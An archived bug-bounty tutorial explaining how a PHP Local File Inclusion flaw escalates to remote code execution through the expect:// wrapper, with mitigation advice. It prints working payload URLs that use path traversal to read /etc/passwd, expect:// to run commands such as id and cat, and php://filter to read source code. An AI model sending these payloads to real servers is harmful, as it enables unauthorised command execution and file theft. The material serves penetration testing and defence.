# From LFI to RCE via expect

- **Source URL:** https://medium.com/@zoningxtr/from-lfi-to-rce-via-expect-php-wrapper-a-deep-dive-with-practical-examples-699690073fe8?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250905200557/https://medium.com/@zoningxtr/from-lfi-to-rce-via-expect-php-wrapper-a-deep-dive-with-practical-examples-699690073fe8?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/10106 (id 10106)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# 💥 From LFI to RCE via `expect://` PHP Wrapper — A Deep Dive with Practical Examples ✨

By

*Local File Inclusion (LFI) bugs are often underestimated, but when combined with PHP stream wrappers, they can escalate into Remote Code Execution (RCE). One of the most powerful yet overlooked techniques is abusing the expect:// PHP wrapper. 💥✨*

*In this deep dive guide, we’ll explore how attackers leverage expect:// to transform a low-severity LFI into a full system compromise. With step-by-step breakdowns and practical payloads, you’ll learn how this technique works in real-world bug bounty scenarios.*

D*isclaimer: This content is for educational purposes only. The author is not responsible for any use or misuse of the information provided. You are solely responsible for your actions. Always act ethically and ensure you have proper authorization.*

*Found a Local File Inclusion (LFI) bug? It’s not just for reading files. Some lesser-known PHP wrappers, like expect://, can turn LFI into full Remote Code Execution (RCE). This post breaks it all down in simple, practical terms.*


## 📃 What is the `expect://` Wrapper?

The `expect://` wrapper is a special PHP stream wrapper that can be used to **execute system commands**. It is part of the **PECL expect extension**, which is not enabled by default but can be installed manually.

When active, the `expect://` wrapper allows developers to write code like:

`include("expect://id");`
And it would return the result of running the `id` command on the system!

## 🔎 Why This Matters in LFI Exploitation

In a vulnerable application:

`<?php include($_GET['page']); ?>`
If the `expect` extension is enabled, an attacker could craft a payload like:

`https://target.com/index.php?page=expect://id`
This will:

- Trigger the LFI
- Include `expect://id`
- Execute the command `id` on the server

And return output like:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
Boom — you’ve turned LFI into RCE using `expect://`. 🚀

## 🛠️ Step-by-Step Exploitation

## ✅ Step 1: Confirm LFI

Visit something like:

`https://target.com/index.php?page=../../../../etc/passwd`
If you see system file content, you have confirmed an LFI vulnerability.

## ✅ Step 2: Test the `expect://` Wrapper

Now try including a system command using `expect://`:

`https://target.com/index.php?page=expect://id`
If the wrapper is enabled and not blocked, the server will **execute** the `id` command.

You might see output like:

`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
Try other commands:

```
?page=expect://ls
?page=expect://whoami
?page=expect://cat+/etc/passwd
```
## 🤔 How to Check If `expect` Is Enabled

It is not commonly enabled, but if you have LFI and want to check:

1. Look for a `phpinfo()` page exposed (e.g., `info.php`)
2. Or include `php://filter/convert.base64-encode/resource=index.php` and decode the result

You’re looking for something like:

`expect support => enabled`
## 🔒 How to Mitigate

## ⛔ Never dynamically include user input

```
// BAD
include($_GET['page']);
```
## ✅ Use Whitelisting

```
$pages = ['home' => 'home.php', 'contact' => 'contact.php'];
if (in_array($_GET['page'], array_keys($pages))) {
  include($pages[$_GET['page']]);
}
```
## 🔐 Disable PHP Wrappers You Don’t Use

- Use `disable_functions` in `php.ini`
- Avoid installing PECL extensions like `expect`

## 🔐 Harden Server Configuration

```
allow_url_include = Off
allow_url_fopen = Off
```
## 🕵️ Final Thoughts

While the `expect://` wrapper is rare, it’s an example of how **LFI can be weaponized** into code execution without touching the filesystem.

If you find LFI:

- Always test for wrappers (`php://`, `expect://`, `data://`, etc.)
- Always stay ethical and legal — use this only in pentesting, bug bounties, and labs

*One simple file inclusion + one exotic wrapper = Total Server Compromise🌟*
